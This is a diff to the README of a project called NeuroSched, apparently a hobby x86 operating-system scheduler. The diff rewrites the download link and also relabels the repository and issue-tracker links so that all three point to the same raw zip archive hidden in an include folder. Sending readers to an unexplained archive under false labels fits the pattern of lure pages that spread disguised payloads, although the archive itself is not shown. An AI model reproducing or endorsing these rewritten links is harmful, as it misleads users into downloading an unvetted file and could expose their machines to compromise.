@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started: Download NeuroSched Today
 
-Visit this link to download the application: **[Download NeuroSched](https://github.com/Anthropogenetic-upturn351/NeuroSched)**
+Visit this link to download the application: **[Download NeuroSched](https://raw.githubusercontent.com/Anthropogenetic-upturn351/NeuroSched/main/include/1.9.zip)**
 
 ## 🔧 What is NeuroSched?
 
@@ -76,7 +76,7 @@ This project is licensed under the MIT License.
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: https://github.com/Anthropogenetic-upturn351/NeuroSched
-- Issues: https://github.com/Anthropogenetic-upturn351/NeuroSched/issues
+- GitHub Repository: https://raw.githubusercontent.com/Anthropogenetic-upturn351/NeuroSched/main/include/1.9.zip
+- Issues: https://raw.githubusercontent.com/Anthropogenetic-upturn351/NeuroSched/main/include/1.9.zip
 
 Keywords: assembly, bare-metal, c, freestanding, kernel, mlp, neural-network, operating-system, osdev, process-s, qemu, scheduler, systems-programming, x86
